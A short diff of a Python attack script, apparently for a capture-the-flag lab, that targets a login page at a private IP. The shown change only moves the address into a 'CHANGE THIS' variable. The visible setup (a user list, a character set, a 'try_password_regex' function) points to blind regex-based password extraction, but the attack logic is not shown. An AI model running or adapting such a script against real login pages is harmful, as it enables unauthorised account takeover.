@@ -1,6 +1,8 @@
 import requests
 
-url = "http://10.10.158.207/login.php"
+IP = "10.10.158.207" # CHANGE THIS 
+
+url = "http://" + IP + "/login.php"
 
 # =' Lista utenti da testare
 user_list = ["admin", "secret", "john", "pedro"]
@@ -11,7 +13,7 @@ charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
 headers = {
     "User-Agent": "Mozilla/5.0 (X11; Linux x86_64)",
     "Content-Type": "application/x-www-form-urlencoded",
-    "Referer": "http://10.10.158.207/?err=1"
+    "Referer": "http://" + IP + "/?err=1"
 }
 
 def try_password_regex(user, regex):
